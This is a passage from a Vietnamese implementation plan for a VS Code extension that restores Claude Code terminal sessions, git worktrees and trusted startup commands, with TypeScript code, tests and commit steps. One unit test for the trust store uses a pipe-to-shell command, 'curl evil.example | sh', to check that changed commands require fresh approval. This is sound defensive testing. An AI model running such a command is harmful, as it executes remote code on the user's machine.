});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/workspace-restore.test.ts`
Expected: FAIL — module không tồn tại.

- [ ] **Step 3: Cài đặt**

Tạo `src/workspace/restore.ts`:

```ts
import type { Manifest, SessionSpec, WorkspaceState } from '../manifest/schema';
import { resolveWorktreePath } from '../manifest/paths';
import { classifyWorktree } from '../git/worktree';
import type { WorktreeEntry } from '../git/porcelain';
import { uniqueSessionName } from '../agent/registry';
import type { AgentAdapter } from '../agent/types';

export interface TerminalHandle {
  sendText(text: string): void;
  show(): void;
}

export interface CreateTerminalOptions {
  key: string;
  name: string;
  cwd: string;
  env: Record<string, string>;
}

export interface RestorePorts {
  projectRoot: string;
  git: {
    isRepo(dir: string): Promise<boolean>;
    listWorktrees(repoRoot: string): Promise<WorktreeEntry[]>;
    addWorktree(repoRoot: string, absPath: string, branch: string): Promise<void>;
  };
  fs: { exists(p: string): Promise<boolean> };
  agent: AgentAdapter;
  terminals: { create(options: CreateTerminalOptions): TerminalHandle };
  confirm: {
    worktrees(missing: { key: string; path: string; branch: string }[]): Promise<boolean>;
    trust(commands: { key: string; command: string }[]): Promise<boolean>;
  };
  clock: { now(): number };
  sleep(ms: number): Promise<void>;
  /** Số lần poll registry trước khi kết luận thất bại. */
  waitAttempts: number;
}

export interface StartedSession {
  key: string;
  name: string;
  sessionId: string;
  cwd: string;
  warnings: string[];
}

export interface FailedSession {
  key: string;
  reason: string;
}

export interface RestoreReport {
  started: StartedSession[];
  failed: FailedSession[];
  skippedWorktrees: string[];
}

const POLL_INTERVAL_MS = 1000;

export async function restoreWorkspace(
  manifest: Manifest,
  state: WorkspaceState,
  ports: RestorePorts,
): Promise<RestoreReport> {
  const report: RestoreReport = { started: [], failed: [], skippedWorktrees: [] };

  if (!(await ports.agent.isAvailable())) {
    for (const session of manifest.sessions) {
      report.failed.push({
        key: session.key,
        reason: 'Không tìm thấy lệnh `claude` trong PATH. Cài Claude Code rồi mở lại workspace.',
      });
    }
    return report;
  }

  const isRepo = await ports.git.isRepo(ports.projectRoot);
  const entries: WorktreeEntry[] = isRepo ? await ports.git.listWorktrees(ports.projectRoot) : [];

  // Bước 1: phân loại worktree cho mọi session.
  const plans = await planSessions(manifest.sessions, entries, isRepo, ports);

  // Bước 2: gom worktree thiếu, hỏi một lần.
  const missing = plans.filter((p) => p.needsWorktree !== null);
  if (missing.length > 0) {
    const approved = await ports.confirm.worktrees(
      missing.map((p) => ({ key: p.session.key, path: p.needsWorktree!.path, branch: p.needsWorktree!.branch })),
    );
    for (const plan of missing) {
      if (!approved) { plan.skip = 'worktree'; continue; }
      try {
        await ports.git.addWorktree(ports.projectRoot, plan.needsWorktree!.path, plan.needsWorktree!.branch);
      } catch (error) {
        plan.skip = 'worktree';
        plan.failReason = `Tạo worktree thất bại: ${String(error)}`;
      }
    }
  }

  // Bước 3: trust cho startupCommand.
  const commands = plans
    .filter((p) => p.skip === null && p.session.startupCommand !== null)
    .map((p) => ({ key: p.session.key, command: p.session.startupCommand! }));
  const trusted = commands.length === 0 ? true : await ports.confirm.trust(commands);

  // Bước 4: đặt tên duy nhất trên toàn máy.
  const taken = new Set(
    (await ports.agent.listRunning()).map((r) => r.name).filter((n): n is string => n !== null),
  );

  // Bước 5: tạo terminal và launch.
  const expected: { key: string; sessionId: string }[] = [];
  for (const plan of plans) {
    if (plan.skip === 'worktree') {
      report.skippedWorktrees.push(plan.session.key);
      if (plan.failReason) report.failed.push({ key: plan.session.key, reason: plan.failReason });
      continue;
    }

    try {
      const name = uniqueSessionName(plan.session.name, taken);
      if (name !== plan.session.name) {
        plan.warnings.push(`Tên "${plan.session.name}" đã bị một session khác chiếm; dùng "${name}".`);
      }
      taken.add(name);

      const previous = state.sessions[plan.session.key];
      const sessionId = previous?.sessionId ?? ports.agent.newSessionId();
      const mode = previous?.sessionId
        ? ({ kind: 'resume', sessionId } as const)
        : ({ kind: 'new', sessionId } as const);

      const env: Record<string, string> = {};
      if (plan.session.role === 'coordinator') env.CLAUDE_CODE_COORDINATOR_MODE = '1';

      const terminal = ports.terminals.create({
        key: plan.session.key,
        name: plan.session.terminal.name,
        cwd: plan.cwd,
        env,
      });
      if (plan.session.startupCommand !== null) {
        if (trusted) terminal.sendText(plan.session.startupCommand);
        else plan.warnings.push('Bỏ qua startup command vì bạn chưa tin manifest này.');
      }
      terminal.sendText(ports.agent.buildLaunchCommand({ name, mode }));

      plan.launched = { name, sessionId };
      expected.push({ key: plan.session.key, sessionId });
    } catch (error) {
      // Một session hỏng không được kéo theo các session khác: ghi nhận rồi đi tiếp.
      report.failed.push({
        key: plan.session.key,
        reason: `Không mở được session: ${String(error)}`,
      });
    }
  }

  // Bước 6: chờ registry xác nhận.
  const seen = await waitForSessions(expected.map((e) => e.sessionId), ports);

  for (const plan of plans) {
    if (!plan.launched) continue;
    if (seen.has(plan.launched.sessionId)) {
      report.started.push({
        key: plan.session.key,
        name: plan.launched.name,
        sessionId: plan.launched.sessionId,
        cwd: plan.cwd,
        warnings: plan.warnings,
      });
    } else {
      report.failed.push({
        key: plan.session.key,
        reason: 'Session không xuất hiện trong registry của Claude Code sau khi chờ.',
      });
    }
  }

  return report;
}

interface SessionPlan {
  session: SessionSpec;
  cwd: string;
  warnings: string[];
  needsWorktree: { path: string; branch: string } | null;
  skip: 'worktree' | null;
  failReason: string | null;
  launched: { name: string; sessionId: string } | null;
}

async function planSessions(
  sessions: SessionSpec[],
  entries: WorktreeEntry[],
  isRepo: boolean,
  ports: RestorePorts,
): Promise<SessionPlan[]> {
  const plans: SessionPlan[] = [];

  for (const session of sessions) {
    const plan: SessionPlan = {
      session, cwd: ports.projectRoot, warnings: [],
      needsWorktree: null, skip: null, failReason: null, launched: null,
    };

    if (session.worktree === null) { plans.push(plan); continue; }

    if (!isRepo) {
      plan.warnings.push('Project không phải git repository; bỏ qua worktree và chạy ở thư mục gốc.');
      plans.push(plan);
      continue;
    }

    const absolute = resolveWorktreePath(ports.projectRoot, session.worktree.path);
    const status = classifyWorktree({
      expectedPath: absolute,
      expectedBranch: session.worktree.branch,
      entries,
      pathExists: await ports.fs.exists(absolute),
    });

    plan.cwd = absolute;
    switch (status.kind) {
      case 'ok':
        break;
      case 'missing':
        plan.needsWorktree = { path: absolute, branch: session.worktree.branch };
        break;
      case 'not-registered':
        plan.warnings.push(`Thư mục ${absolute} tồn tại nhưng git không đăng ký là worktree; vẫn chạy ở đó.`);
        break;
      case 'branch-mismatch':
        plan.warnings.push(
          `Worktree đang ở branch ${status.actual ?? '(detached)'} thay vì ${session.worktree.branch}; không đổi branch của bạn.`,
        );
        break;
    }
    plans.push(plan);
  }

  return plans;
}

async function waitForSessions(expected: string[], ports: RestorePorts): Promise<Set<string>> {
  const seen = new Set<string>();
  if (expected.length === 0) return seen;

  for (let attempt = 0; attempt < ports.waitAttempts; attempt += 1) {
    for (const running of await ports.agent.listRunning()) seen.add(running.sessionId);
    if (expected.every((id) => seen.has(id))) return seen;
    await ports.sleep(POLL_INTERVAL_MS);
  }
  return seen;
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/workspace-restore.test.ts`
Expected: 15 test PASS.

- [ ] **Step 5: Chạy toàn bộ test và typecheck**

Run: `npm test && npm run typecheck`
Expected: tất cả PASS.

- [ ] **Step 6: Commit**

```bash
git add src/workspace/restore.ts test/unit/workspace-restore.test.ts
git commit -m "feat(workspace): điều phối restore với cách ly lỗi từng session

Worktree thiếu hỏi một lần rồi tạo; branch lệch chỉ cảnh báo; một session
hỏng không chặn các session khác.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 14: Lớp vỏ VS Code — terminal và trust

**Files:**
- Create: `src/terminal/manager.ts`
- Create: `src/trust/store.ts`
- Test: `test/unit/trust-store.test.ts`

**Interfaces:**
- Consumes: `TerminalHandle`, `CreateTerminalOptions` (Task 13)
- Produces:
  - `class TerminalManager` — `create(key, options): TerminalHandle`, `focus(key): boolean`, `closeAll(): void`, `onClosed(cb: (key: string) => void): vscode.Disposable`
  - `interface TrustMemory { get(k: string): string | undefined; set(k: string, v: string): Promise<void> }`
  - `class TrustStore` — `isTrusted(manifestPath, commands): boolean`, `trust(manifestPath, commands): Promise<void>`
  - `fingerprintCommands(commands: string[]): string`

`TrustStore` nhận `TrustMemory` nên test được không cần VS Code; `TerminalManager` chỉ được kiểm ở Task 16.

- [ ] **Step 1: Viết test cho TrustStore**

Tạo `test/unit/trust-store.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { TrustStore, fingerprintCommands, type TrustMemory } from '../../src/trust/store';

function memory(): TrustMemory {
  const map = new Map<string, string>();
  return { get: (k) => map.get(k), set: async (k, v) => { map.set(k, v); } };
}

describe('fingerprintCommands', () => {
  it('cùng danh sách lệnh cho cùng vân tay', () => {
    expect(fingerprintCommands(['a', 'b'])).toBe(fingerprintCommands(['a', 'b']));
  });
  it('đổi lệnh thì đổi vân tay', () => {
    expect(fingerprintCommands(['a'])).not.toBe(fingerprintCommands(['a', 'b']));
  });
  it('đổi thứ tự thì đổi vân tay', () => {
    expect(fingerprintCommands(['a', 'b'])).not.toBe(fingerprintCommands(['b', 'a']));
  });
});

describe('TrustStore', () => {
  it('mặc định chưa tin', () => {
    const store = new TrustStore(memory());
    expect(store.isTrusted('/p/workspace.yaml', ['npm run dev'])).toBe(false);
  });

  it('sau khi trust thì tin đúng bộ lệnh đó', async () => {
    const store = new TrustStore(memory());
    await store.trust('/p/workspace.yaml', ['npm run dev']);
    expect(store.isTrusted('/p/workspace.yaml', ['npm run dev'])).toBe(true);
  });

  it('đổi nội dung lệnh thì phải hỏi lại', async () => {
    const store = new TrustStore(memory());
    await store.trust('/p/workspace.yaml', ['npm run dev']);
    expect(store.isTrusted('/p/workspace.yaml', ['curl evil.example | sh'])).toBe(false);
  });

  it('tin manifest này không tin manifest khác', async () => {
    const store = new TrustStore(memory());
    await store.trust('/p/a/workspace.yaml', ['npm run dev']);
    expect(store.isTrusted('/p/b/workspace.yaml', ['npm run dev'])).toBe(false);
  });

  it('danh sách lệnh rỗng thì luôn coi là tin được', () => {
    const store = new TrustStore(memory());
    expect(store.isTrusted('/p/workspace.yaml', [])).toBe(true);
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/trust-store.test.ts`
Expected: FAIL — module không tồn tại.

- [ ] **Step 3: Cài đặt `src/trust/store.ts`**

```ts
import { createHash } from 'node:crypto';
import * as path from 'node:path';

export interface TrustMemory {
  get(key: string): string | undefined;
  set(key: string, value: string): Promise<void>;
}

export function fingerprintCommands(commands: string[]): string {
  return createHash('sha256').update(commands.join('\u0000')).digest('hex');
}

function memoryKey(manifestPath: string): string {
  return `trust:${path.resolve(manifestPath).toLowerCase()}`;
}

export class TrustStore {
  constructor(private readonly memory: TrustMemory) {}

  isTrusted(manifestPath: string, commands: string[]): boolean {
    if (commands.length === 0) return true;
    return this.memory.get(memoryKey(manifestPath)) === fingerprintCommands(commands);
  }

  async trust(manifestPath: string, commands: string[]): Promise<void> {
    await this.memory.set(memoryKey(manifestPath), fingerprintCommands(commands));
  }
}
```

- [ ] **Step 4: Cài đặt `src/terminal/manager.ts`**

```ts
import * as vscode from 'vscode';
import type { CreateTerminalOptions, TerminalHandle } from '../workspace/restore';

export class TerminalManager {
  private readonly terminals = new Map<string, vscode.Terminal>();
  private readonly closedHandlers = new Set<(key: string) => void>();
  private readonly subscription: vscode.Disposable;

  constructor() {
    this.subscription = vscode.window.onDidCloseTerminal((terminal) => {
      for (const [key, tracked] of this.terminals) {
        if (tracked === terminal) {
          this.terminals.delete(key);
          for (const handler of this.closedHandlers) handler(key);
        }
      }
    });
  }

  create(key: string, options: CreateTerminalOptions): TerminalHandle {
    const terminal = vscode.window.createTerminal({
      name: options.name,
      cwd: options.cwd,
      env: options.env,
    });
    this.terminals.set(key, terminal);
    terminal.show(false);
    return {
      sendText: (text) => terminal.sendText(text, true),
      show: () => terminal.show(false),
    };
  }

  focus(key: string): boolean {
    const terminal = this.terminals.get(key);
    if (!terminal) return false;
    terminal.show(false);
    return true;
  }

  has(key: string): boolean {
    return this.terminals.has(key);
  }

  onClosed(handler: (key: string) => void): vscode.Disposable {
    this.closedHandlers.add(handler);
    return new vscode.Disposable(() => this.closedHandlers.delete(handler));
  }

  closeAll(): void {
    for (const terminal of this.terminals.values()) terminal.dispose();
    this.terminals.clear();
  }

  dispose(): void {
    this.subscription.dispose();
    this.closedHandlers.clear();
  }
}
```

- [ ] **Step 5: Chạy test và typecheck, xác nhận PASS**

Run: `npx vitest run test/unit/trust-store.test.ts && npm run typecheck`
Expected: 8 test PASS, tsc không lỗi.

- [ ] **Step 6: Commit**

```bash
git add src/trust/store.ts src/terminal/manager.ts test/unit/trust-store.test.ts
git commit -m "feat: trust store cho startup command và quản lý terminal

Trust gắn theo đường dẫn manifest + vân tay nội dung lệnh, đổi lệnh phải hỏi lại.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 15: WorkspaceManager và các lệnh

**Files:**
- Create: `src/workspace/manager.ts`
- Create: `src/ui/commands.ts`
- Modify: `src/extension.ts`
- Modify: `package.json` (mục `contributes.commands`, `contributes.views`, `activationEvents`)

**Interfaces:**
- Consumes: mọi thứ từ Task 3–14
- Produces:
  - `class WorkspaceManager` — `newWorkspace()`, `save()`, `open(manifestPath)`, `openViaQuickPick()`, `close()`, `addSession()`, `removeSession(key)`, `focusSession(key)`, `restoreSession(key)`, `currentSessions(): SessionView[]`, `refreshStatuses(): Promise<void>`
  - `interface SessionView { key: string; name: string; role: string; branch: string | null; status: SessionStatus }`
  - `registerCommands(context: vscode.ExtensionContext, manager: WorkspaceManager): void`

- [ ] **Step 1: Cập nhật `package.json` phần contributes**

```json
{
  "activationEvents": ["onStartupFinished"],
  "contributes": {
    "commands": [
      { "command": "aiWorkspace.newWorkspace",     "title": "AI Workspace: New Workspace" },
      { "command": "aiWorkspace.saveWorkspace",    "title": "AI Workspace: Save Workspace" },
      { "command": "aiWorkspace.openWorkspace",    "title": "AI Workspace: Open Workspace" },
      { "command": "aiWorkspace.closeWorkspace",   "title": "AI Workspace: Close Workspace" },
      { "command": "aiWorkspace.addSession",       "title": "AI Workspace: Add Session" },
      { "command": "aiWorkspace.removeSession",    "title": "AI Workspace: Remove Session" },
      { "command": "aiWorkspace.openSessionTerminal", "title": "AI Workspace: Open Session Terminal" },
      { "command": "aiWorkspace.restoreSession",   "title": "AI Workspace: Restore Session" }
    ],
    "views": {
      "explorer": [
        { "id": "aiWorkspace.sessions", "name": "AI Workspace" }
      ]
    }
  }
}
```

- [ ] **Step 2: Cài đặt `src/workspace/manager.ts`**

```ts
import * as path from 'node:path';
import { promises as fsp } from 'node:fs';
import * as vscode from 'vscode';
import { readManifest, writeManifest, readState, writeState, ManifestError } from '../manifest/store';
import { manifestFilePath, resolveProjectRoot, toStoredPath } from '../manifest/paths';
import { ManifestSchema, type Manifest, type SessionSpec, type SessionStatus, type WorkspaceState } from '../manifest/schema';
import { GitClient } from '../git/worktree';
import { realGitRunner } from '../git/exec';
import { ClaudeCodeAdapter } from '../agent/claude';
import { detectShellKind } from '../agent/quote';
import { WorkspaceIndex } from '../index/store';
import { TrustStore } from '../trust/store';
import { TerminalManager } from '../terminal/manager';
import { EventBus } from '../events/bus';
import { restoreWorkspace, type RestorePorts, type RestoreReport } from './restore';

export interface SessionView {
  key: string;
  name: string;
  role: string;
  branch: string | null;
  status: SessionStatus;
}

export class WorkspaceManager {
  private manifest: Manifest | null = null;
  private state: WorkspaceState = { version: 1, sessions: {} };
  private projectRoot: string | null = null;
  private manifestPath: string | null = null;
  private statuses = new Map<string, SessionStatus>();

  readonly bus = new EventBus();
  private readonly onChanged = new vscode.EventEmitter<void>();
  readonly onDidChange = this.onChanged.event;

  constructor(
    private readonly terminals: TerminalManager,
    private readonly index: WorkspaceIndex,
    private readonly trust: TrustStore,
    private readonly git = new GitClient(realGitRunner),
    private readonly agent = new ClaudeCodeAdapter(
      detectShellKind(process.platform, vscode.env.shell),
    ),
  ) {
    this.terminals.onClosed((key) => {
      this.statuses.set(key, 'offline');
      this.onChanged.fire();
    });
  }

  get workspaceName(): string | null {
    return this.manifest?.workspace.name ?? null;
  }

  currentSessions(): SessionView[] {
    if (!this.manifest) return [];
    return this.manifest.sessions.map((s) => ({
      key: s.key,
      name: s.name,
      role: s.role,
      branch: s.worktree?.branch ?? null,
      status: this.statuses.get(s.key) ?? 'offline',
    }));
  }

  async newWorkspace(): Promise<void> {
    const folder = vscode.workspace.workspaceFolders?.[0];
    if (!folder) {
      await vscode.window.showErrorMessage('Hãy mở một thư mục dự án trước khi tạo AI Workspace.');
      return;
    }
    const name = await vscode.window.showInputBox({
      prompt: 'Tên workspace',
      value: path.basename(folder.uri.fsPath),
      validateInput: (v) => (v.trim() === '' ? 'Tên không được để trống' : undefined),
    });
    if (name === undefined) return;

    this.projectRoot = folder.uri.fsPath;
    this.manifestPath = manifestFilePath(this.projectRoot);
    this.manifest = ManifestSchema.parse({ version: 1, workspace: { name }, sessions: [] });
    this.state = { version: 1, sessions: {} };
    this.statuses.clear();

    await this.save();
    this.bus.emit('WorkspaceOpened', { name });
    this.onChanged.fire();
  }

  async save(): Promise<void> {
    if (!this.manifest || !this.projectRoot || !this.manifestPath) {
      await vscode.window.showWarningMessage('Chưa có workspace nào đang mở.');
      return;
    }
    await writeManifest(this.projectRoot, this.manifest);
    await writeState(this.projectRoot, this.state);
    await this.index.upsert({
      name: this.manifest.workspace.name,
      manifestPath: this.manifestPath,
      lastOpenedAt: Date.now(),
    });
    await vscode.window.showInformationMessage(`Đã lưu workspace "${this.manifest.workspace.name}".`);
  }

  async openViaQuickPick(): Promise<void> {
    const entries = await this.index.prune(async (p) => {
      try { await fsp.access(p); return true; } catch { return false; }
    });
    if (entries.length === 0) {
      await vscode.window.showInformationMessage('Chưa có workspace nào được lưu.');
      return;
    }
    const picked = await vscode.window.showQuickPick(
      entries.map((e) => ({ label: e.name, detail: e.manifestPath, entry: e })),
      { placeHolder: 'Chọn AI Workspace để mở' },
    );
    if (!picked) return;
    await this.open(picked.entry.manifestPath);
  }

  async open(manifestPath: string): Promise<void> {
    let manifest: Manifest;
    const projectRoot = resolveProjectRoot(manifestPath, '.');
    try {
      manifest = await readManifest(projectRoot);
    } catch (error) {
      if (error instanceof ManifestError) {
        await vscode.window.showErrorMessage(`${error.message}\n${error.issues.join('\n')}`);
      } else {
        await vscode.window.showErrorMessage(String(error));
      }
      return;
    }

    this.manifest = manifest;
    this.manifestPath = manifestPath;
    this.projectRoot = resolveProjectRoot(manifestPath, manifest.project.root);
    this.state = await readState(this.projectRoot);
    this.statuses.clear();

    const report = await vscode.window.withProgress(
      { location: vscode.ProgressLocation.Notification, title: `Đang dựng lại "${manifest.workspace.name}"…` },
      () => restoreWorkspace(manifest, this.state, this.buildPorts()),
    );

    await this.applyReport(report);
    await this.index.upsert({
      name: manifest.workspace.name, manifestPath, lastOpenedAt: Date.now(),
    });
    this.bus.emit('WorkspaceOpened', { name: manifest.workspace.name });
    this.onChanged.fire();
  }

  async close(): Promise<void> {
    if (!this.manifest || !this.projectRoot) return;
    await writeState(this.projectRoot, this.state);
    this.terminals.closeAll();
    this.bus.emit('WorkspaceClosed', { name: this.manifest.workspace.name });
    this.manifest = null;
    this.manifestPath = null;
    this.projectRoot = null;
    this.statuses.clear();
    this.onChanged.fire();
  }

  async addSession(): Promise<void> {
    if (!this.manifest || !this.projectRoot) {
      await vscode.window.showWarningMessage('Hãy tạo hoặc mở một workspace trước.');
      return;
    }
    const key = await vscode.window.showInputBox({
      prompt: 'Khoá session (chữ thường, số, gạch ngang)',
      validateInput: (v) => (/^[a-z0-9][a-z0-9-]*$/.test(v) ? undefined : 'Chỉ chữ thường, số và dấu gạch ngang'),
    });
    if (key === undefined) return;
    if (this.manifest.sessions.some((s) => s.key === key)) {
      await vscode.window.showErrorMessage(`Khoá "${key}" đã tồn tại trong workspace này.`);
      return;
    }

    const name = await vscode.window.showInputBox({
      prompt: 'Tên session (đây là địa chỉ để các session khác nhắn tới)',
      value: `${this.manifest.workspace.name}-${key}`,
    });
    if (name === undefined) return;

    const role = await vscode.window.showInputBox({ prompt: 'Vai trò', value: 'developer' });
    if (role === undefined) return;

    const branch = await vscode.window.showInputBox({
      prompt: 'Branch cho git worktree (để trống nếu chạy thẳng ở thư mục dự án)',
      value: '',
    });
    if (branch === undefined) return;

    let worktree: SessionSpec['worktree'] = null;
    if (branch.trim() !== '') {
      const suggested = path.resolve(this.projectRoot, '..', `${path.basename(this.projectRoot)}-${key}`);
      const wtPath = await vscode.window.showInputBox({ prompt: 'Đường dẫn worktree', value: suggested });
      if (wtPath === undefined) return;
      worktree = { path: toStoredPath(this.projectRoot, wtPath), branch: branch.trim() };
    }

    const startup = await vscode.window.showInputBox({
      prompt: 'Startup command chạy trước khi mở Claude (để trống nếu không cần)',
      value: '',
    });
    if (startup === undefined) return;

    const session = ManifestSchema.shape.sessions.element.parse({
      key, name, role, worktree,
      terminal: { name },
      startupCommand: startup.trim() === '' ? null : startup.trim(),
      agent: 'claude',
    });
    this.manifest.sessions.push(session);
    await this.save();
    this.onChanged.fire();
  }

  async removeSession(key: string): Promise<void> {
    if (!this.manifest) return;
    const confirmed = await vscode.window.showWarningMessage(
      `Gỡ session "${key}" khỏi workspace? Worktree và mã nguồn không bị đụng tới.`,
      { modal: true }, 'Gỡ',
    );
    if (confirmed !== 'Gỡ') return;
    this.manifest.sessions = this.manifest.sessions.filter((s) => s.key !== key);
    delete this.state.sessions[key];
    this.statuses.delete(key);
    await this.save();
    this.onChanged.fire();
  }

  focusSession(key: string): void {
    if (!this.terminals.focus(key)) {
      void vscode.window.showInformationMessage(
        `Session "${key}" chưa chạy. Dùng lệnh "AI Workspace: Restore Session" để mở lại.`,
      );
    }
  }

  async restoreSession(key: string): Promise<void> {
    if (!this.manifest || !this.projectRoot) return;
    const session = this.manifest.sessions.find((s) => s.key === key);
    if (!session) return;
    const single: Manifest = { ...this.manifest, sessions: [session] };
    const report = await restoreWorkspace(single, this.state, this.buildPorts());
    await this.applyReport(report);
    this.onChanged.fire();
  }

  async refreshStatuses(): Promise<void> {
    if (!this.manifest) return;
    const running = new Map((await this.agent.listRunning()).map((r) => [r.sessionId, r]));
    let changed = false;
    for (const session of this.manifest.sessions) {
      const sessionId = this.state.sessions[session.key]?.sessionId;
      const next: SessionStatus = sessionId && running.has(sessionId)
        ? running.get(sessionId)!.status
        : 'offline';
      if (this.statuses.get(session.key) !== next) {
        this.statuses.set(session.key, next);
        this.bus.emit('SessionStatusChanged', { key: session.key, status: next });
        changed = true;
      }
      const entry = sessionId ? this.state.sessions[session.key] : undefined;
      if (entry) {
        entry.lastStatus = next;
        entry.lastActiveAt = Date.now();
        entry.pid = running.get(entry.sessionId)?.pid ?? null;
      }
    }
    if (changed) {
      if (this.projectRoot) await writeState(this.projectRoot, this.state);
      this.onChanged.fire();
    }
  }

  private buildPorts(): RestorePorts {
    const projectRoot = this.projectRoot!;
    const manifestPath = this.manifestPath!;
    return {
      projectRoot,
      git: {
        isRepo: (dir) => this.git.isRepo(dir),
        listWorktrees: (root) => this.git.listWorktrees(root),
        addWorktree: (root, abs, branch) => this.git.addWorktree(root, abs, branch),
      },
      fs: { exists: async (p) => { try { await fsp.access(p); return true; } catch { return false; } } },
      agent: this.agent,
      terminals: { create: (options) => this.terminals.create(options.key, options) },
      confirm: {
        worktrees: async (missing) => {
          const lines = missing.map((m) => `• ${m.path}  (branch ${m.branch})`).join('\n');
          const answer = await vscode.window.showWarningMessage(
            `Thiếu ${missing.length} git worktree. Tạo bằng \`git worktree add\`?\n\n${lines}`,
            { modal: true }, 'Tạo worktree',
          );
          return answer === 'Tạo worktree';
        },
        trust: async (commands) => {
          const list = commands.map((c) => c.command);
          if (this.trust.isTrusted(manifestPath, list)) return true;
          const lines = commands.map((c) => `• [${c.key}] ${c.command}`).join('\n');
          const answer = await vscode.window.showWarningMessage(
            `Workspace này sẽ chạy các lệnh sau trên máy bạn:\n\n${lines}`,
            { modal: true }, 'Tin và chạy',
          );
          if (answer !== 'Tin và chạy') return false;
          await this.trust.trust(manifestPath, list);
          return true;
        },
      },
      clock: { now: () => Date.now() },
      sleep: (ms) => new Promise((resolve) => setTimeout(resolve, ms)),
      waitAttempts: 20,
    };
  }

  private async applyReport(report: RestoreReport): Promise<void> {
    for (const started of report.started) {
      this.state.sessions[started.key] = {
        sessionId: started.sessionId,
        pid: null,
        lastStatus: 'idle',
        lastActiveAt: Date.now(),
      };
      this.statuses.set(started.key, 'idle');
      this.bus.emit('SessionStarted', { key: started.key, sessionId: started.sessionId });
      for (const warning of started.warnings) {
        void vscode.window.showWarningMessage(`[${started.key}] ${warning}`);
      }
    }
    for (const failed of report.failed) {
      this.statuses.set(failed.key, 'error');
      this.bus.emit('SessionFailed', { key: failed.key, reason: failed.reason });
    }
    if (this.projectRoot) await writeState(this.projectRoot, this.state);

    const total = report.started.length + report.failed.length;
    const message = `Đã dựng ${report.started.length}/${total} session.`;
    if (report.failed.length === 0) {
      await vscode.window.showInformationMessage(message);
    } else {
      const detail = report.failed.map((f) => `• ${f.key}: ${f.reason}`).join('\n');
      await vscode.window.showWarningMessage(`${message}\n\n${detail}`, { modal: true });
    }
  }
}
```

- [ ] **Step 3: Chạy lại test Task 13, xác nhận vẫn PASS**

`CreateTerminalOptions` đã có trường `key` từ Task 13 nên `buildPorts()` chuyển thẳng `options.key` xuống `TerminalManager.create(key, options)`. Không có trạng thái tạm nào giữa hai lớp.

Run: `npx vitest run test/unit/workspace-restore.test.ts`
Expected: 14 test PASS (các assert đọc `opts.cwd` và `opts.env` không đổi).

- [ ] **Step 4: Cài đặt `src/ui/commands.ts`**

```ts
import * as vscode from 'vscode';
import type { WorkspaceManager } from '../workspace/manager';
import type { SessionTreeItem } from './tree';

export function registerCommands(context: vscode.ExtensionContext, manager: WorkspaceManager): void {
  const register = (id: string, handler: (...args: never[]) => unknown): void => {
    context.subscriptions.push(vscode.commands.registerCommand(id, handler));
  };

  register('aiWorkspace.newWorkspace', () => manager.newWorkspace());
  register('aiWorkspace.saveWorkspace', () => manager.save());
  register('aiWorkspace.openWorkspace', () => manager.openViaQuickPick());
  register('aiWorkspace.closeWorkspace', () => manager.close());
  register('aiWorkspace.addSession', () => manager.addSession());

  register('aiWorkspace.removeSession', async (item?: SessionTreeItem) => {
    const key = item?.sessionKey ?? (await pickSessionKey(manager, 'Chọn session để gỡ'));
    if (key) await manager.removeSession(key);
  });

  register('aiWorkspace.openSessionTerminal', async (item?: SessionTreeItem) => {
    const key = item?.sessionKey ?? (await pickSessionKey(manager, 'Chọn session để mở terminal'));
    if (key) manager.focusSession(key);
  });

  register('aiWorkspace.restoreSession', async (item?: SessionTreeItem) => {
    const key = item?.sessionKey ?? (await pickSessionKey(manager, 'Chọn session để dựng lại'));
    if (key) await manager.restoreSession(key);
  });
}

async function pickSessionKey(manager: WorkspaceManager, placeHolder: string): Promise<string | undefined> {
  const sessions = manager.currentSessions();
  if (sessions.length === 0) {
    await vscode.window.showInformationMessage('Workspace chưa có session nào.');
    return undefined;
  }
  const picked = await vscode.window.showQuickPick(
    sessions.map((s) => ({ label: s.name, description: s.role, detail: s.key, key: s.key })),
    { placeHolder },
  );
  return picked?.key;
}
```

- [ ] **Step 5: Chạy typecheck và build**

Run: `npm run typecheck && npm run build`
Expected: không lỗi. `src/ui/tree.ts` chưa tồn tại nên tạm thời comment dòng `import type { SessionTreeItem }` và thay bằng `type SessionTreeItem = { sessionKey: string }` cục bộ; Task 16 sẽ nối lại.

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "feat(workspace): WorkspaceManager và 8 lệnh của MVP

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 16: Sidebar và test trong Extension Host

**Files:**
- Create: `src/ui/tree.ts`
- Modify: `src/ui/commands.ts` (nối lại import thật)
- Modify: `src/extension.ts`
- Create: `test/vscode/smoke.test.ts`
- Create: `.vscode-test.mjs`
- Modify: `package.json` (devDependencies + script `test:vscode`)

**Interfaces:**
- Consumes: `WorkspaceManager`, `SessionView` (Task 15)
- Produces:
  - `class SessionTreeItem extends vscode.TreeItem` với `readonly sessionKey: string`
  - `class SessionTreeProvider implements vscode.TreeDataProvider<SessionTreeItem>` với `startPolling()`, `stopPolling()`, `dispose()`

- [ ] **Step 1: Cài đặt `src/ui/tree.ts`**

```ts
import * as vscode from 'vscode';
import type { SessionStatus } from '../manifest/schema';
import type { SessionView, WorkspaceManager } from '../workspace/manager';

const POLL_MS = 3000;

const ICONS: Record<SessionStatus, { id: string; color: string }> = {
  busy:    { id: 'circle-filled', color: 'charts.green' },
  idle:    { id: 'circle-filled', color: 'charts.blue' },
  blocked: { id: 'circle-filled', color: 'charts.yellow' },
  offline: { id: 'circle-outline', color: 'disabledForeground' },
  error:   { id: 'error', color: 'charts.red' },
};

const LABELS: Record<SessionStatus, string> = {
  busy: 'đang chạy', idle: 'rảnh', blocked: 'đang chờ',
  offline: 'chưa chạy', error: 'lỗi',
};

export class SessionTreeItem extends vscode.TreeItem {
  constructor(readonly sessionKey: string, view: SessionView) {
    super(view.name, vscode.TreeItemCollapsibleState.None);
    this.description = [view.branch ?? '(không worktree)', LABELS[view.status]].join(' · ');
    this.tooltip = `${view.name}\nVai trò: ${view.role}\nTrạng thái: ${LABELS[view.status]}`;
    const icon = ICONS[view.status];
    this.iconPath = new vscode.ThemeIcon(icon.id, new vscode.ThemeColor(icon.color));
